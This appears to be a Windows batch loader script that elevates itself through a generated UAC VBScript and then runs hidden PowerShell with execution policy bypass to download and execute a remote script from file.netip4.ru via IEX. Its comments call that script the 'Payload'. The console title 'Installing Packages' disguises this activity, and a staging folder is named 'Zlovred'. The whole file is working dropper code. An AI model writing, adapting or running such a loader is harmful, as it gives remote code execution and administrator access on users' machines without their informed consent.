@echo on
rem *******************************************************
rem DownloadRun-Enumerate.bat
rem This Script will Download and Execute
rem a Powershell Script with same Name
rem RETURNS:	0 if Success Run
rem		1 if Check Integrity Error
rem		17 if Run without Elevated Privileges
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=Great-Enumerator
set REDACT=
set FIRM=NIT
set PRODUCT_FOLDER_REMOTE=/PROGS/%FIRM%/%PRODUCT_NAME%/

rem Set a Directory
rem

set CURDIR=%CD%

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem
rem Set Paths and Files
rem
set POSHEXE=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe
set POSHCMDOPT=" -NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass "
set POSHCMDOPT=%POSHCMDOPT:"=%

rem Check Integrity...
rem
if not exist %POSHEXE% echo %POSHEXE% is not found && exit /b 1

rem Set Powershell Script File
rem
set POSHFILE001="DownloadRun-Enumerate.ps1"

rem Set a Host URL...
rem
set aPrefix=http
rem set aDomain=localhost
set aDomain=file.netip4.ru
set aPort=80
set aRemoteDir=%PRODUCT_FOLDER_REMOTE%

rem Derivative Variables...
rem
set aHostUrl=%aPrefix%://%aDomain%:%aPort%%aRemoteDir%%POSHFILE001%

echo Download and Run Payload..
rem
title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
rem exit /b 17
rem
set getadminvbs=nit-%~n0.vbs
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TPDL%\%getadminvbs%"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%TPDL%\%getadminvbs%"

    %wscriptexe% "%TPDL%\%getadminvbs%"
    del "%TPDL%\%getadminvbs%"
    exit /B 0

:gotAdmin
echo Run as Admin...

rem Run Payload...
rem
%POSHEXE% %POSHCMDOPT% -c "IEX((New-Object System.Net.WebClient).DownloadString('%aHostUrl%'))"

:End
echo The Success Script %0 Run
exit /b 0
